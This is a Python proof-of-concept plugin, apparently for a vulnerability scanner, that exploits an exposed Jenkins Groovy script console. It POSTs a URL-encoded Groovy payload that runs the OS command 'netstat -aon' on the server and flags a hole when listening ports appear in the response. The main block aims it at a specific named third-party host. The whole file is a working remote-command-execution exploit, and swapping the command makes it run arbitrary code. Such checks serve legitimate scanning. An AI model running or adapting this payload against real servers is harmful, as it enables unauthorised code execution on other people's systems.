# -*- coding: utf-8 -*-
"""
POC Name  :  jenkins_script_console_java_execution 
Author    :  fenyouxiangyu
mail      :  fenyouxiangyu@sina.cn
Referer   : http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html
"""

# Description : This module uses the Jenkins Groovy script console to execute OS commands using Java.
# Command     : println "netstat -aon".execute().text

def assign(service, arg):
    if service == 'jenkins':
        return True, arg

def audit(arg):
    add_url = 'script/'
    url = arg + add_url
    payload ="script=println+%22netstat+-aon%22.execute%28%29.text&json=%7B%22script%22%3A+%22println+%5C%22netstat+-aon%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22println+%5C%22netstat+-aon%5C%22.execute%28%29.text%22%7D&Submit=%E8%BF%90%E8%A1%8C"
    code, head, res, errcode, _= curl.curl2(url,payload)
    if code == 200 and  'Address' in res and 'LISTEN' in res:
        security_hole(url)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('jenkins', 'http://sinv-56038.edu.hsr.ch/jenkins/')[1])